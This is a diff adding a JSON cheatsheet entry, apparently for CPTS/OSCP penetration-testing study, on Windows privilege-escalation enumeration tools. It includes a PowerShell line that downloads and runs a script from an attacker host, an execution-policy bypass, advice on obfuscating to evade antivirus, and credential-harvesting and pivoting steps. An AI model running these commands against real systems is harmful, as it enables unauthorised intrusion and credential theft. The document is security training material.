@@ -1,0 +1,107 @@
+{
+  "type": "cheatsheet",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "winpeas",
+    "seatbelt",
+    "powerup",
+    "sharpup"
+  ],
+  "tags": [
+    "enumeration",
+    "tooling"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Windows - Enumeration",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 26: Windows Privilege Escalation",
+  "examples": [
+    {
+      "label": "winPEAS - all-in-one enumeration",
+      "command": "winPEASx64.exe"
+    },
+    {
+      "label": "Seatbelt - grouped safety checks",
+      "command": "Seatbelt.exe -group=all"
+    },
+    {
+      "label": "SharpUp - quick privesc audit",
+      "command": ".\\SharpUp.exe audit"
+    },
+    {
+      "label": "PowerUp - PowerShell privesc checks",
+      "command": "IEX(New-Object Net.WebClient).DownloadString('http://<lhost>/PowerUp.ps1'); Invoke-AllChecks"
+    }
+  ],
+  "notes": "=== ENUMERATION TOOLSET OVERVIEW ===\nRun the full toolset immediately after gaining a foothold. Don't wait — the order matters.\n\nTOOL SELECTION DECISION TREE:\n- winPEAS → broadest automated coverage, noisy, many false positives\n- Seatbelt → C# host survey, checks ~50 security-relevant host settings\n- SharpUp → focuses exclusively on privilege escalation misconfigs\n- PowerUp → PowerShell-based, runs where C# tools are blocked\n- Watson → kernel exploit detection by KB vs OS version\n- WES-NG → offline alternative, run systeminfo output through it on attack host\n- LaZagne → credential sweeper, dozens of application categories\n- SessionGopher → targets remote access tool credential stores (PuTTY, WinSCP, RDP)\n\n=== OPERATIONAL NOTES ===\nCompile C# tools from source or use precompiled binaries — AV signatures differ significantly.\nWhen AV is active, try obfuscated PowerShell variants before dropping binaries.\nRun winPEAS and SharpUp results in parallel to cross-reference findings.\nAlways log full output to file: .\\winPEAS.exe | Tee-Object winpeas-out.txt\n\n=== CHAINING CONTEXT ===\nTool output feeds directly into subsequent exploitation:\nwinPEAS/SharpUp → identify weak ACL, unquoted paths, AlwaysInstallElevated\nSeatbelt → identify LSASS protection mode, AppLocker config, AV state\nWatson/WES-NG → identify missing KBs → select kernel exploit\nLaZagne → credential harvest → lateral movement or domain escalation\nSessionGopher → saved RDP/SSH creds → pivot to additional hosts\n\n=== WHAT TO LOOK FOR ===\nNon-standard tokens in whoami /priv (any beyond SeChangeNotify + SeIncreaseWorkingSet)\nGroup memberships beyond standard domain users\nInstalled third-party software (wmic product get name)\nServices running as LocalSystem with modifiable binaries or registry keys\nMissing patches (cross-ref KB list against Watson output) Also covered in: OSCP PEN-200 Chapter 16 (Windows Privilege Escalation).",
+  "references": [
+    {
+      "title": "winPEAS (PEASS-ng)",
+      "url": "https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS"
+    },
+    {
+      "title": "Seatbelt (GhostPack)",
+      "url": "https://github.com/GhostPack/Seatbelt"
+    },
+    {
+      "title": "HackTricks - Windows Local Privilege Escalation",
+      "url": "https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html"
+    },
+    {
+      "title": "HTB Academy - Windows Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/67"
+    },
+    {
+      "title": "OffSec PEN-200 - Windows Privilege Escalation",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "sharpup-audit",
+      "note": "Drill into the weak-service findings.",
+      "rel": "next"
+    },
+    {
+      "id": "missing-patch-enum",
+      "note": "Follow up on the missing-patch findings.",
+      "rel": "next"
+    },
+    {
+      "id": "cred-hunting-findstr",
+      "note": "Hunt credentials the tools flagged.",
+      "rel": "next"
+    }
+  ],
+  "id": "winpe-tools",
+  "name": "WinPE - Enumeration Tool Reference",
+  "command": "winPEASx64.exe   |   Seatbelt.exe -group=all   |   .\\SharpUp.exe audit   |   IEX(...); Invoke-AllChecks",
+  "description": "Automated Windows privilege-escalation enumerators. Run one or more to surface misconfigured services, weak ACLs, unquoted paths, stored creds, and missing patches. Upload to a writable dir like C:\\Windows\\Temp.",
+  "variations": [
+    {
+      "label": "winPEAS / Seatbelt",
+      "command": ".\\winPEASx64.exe\n.\\Seatbelt.exe -group=all"
+    },
+    {
+      "label": "PowerUp / SharpUp",
+      "command": "powershell -ep bypass -c \"Import-Module .\\PowerUp.ps1; Invoke-AllChecks\"\n.\\SharpUp.exe audit"
+    },
+    {
+      "label": "Others",
+      "command": "# JAWS, Watson, wesng, LaZagne, SessionGopher, Sysinternals (accesschk/pipelist/psservice)"
+    }
+  ],
+  "opsec": "moderate",
+  "mitre": [
+    "T1082"
+  ],
+  "exam": "exam-ok"
+}
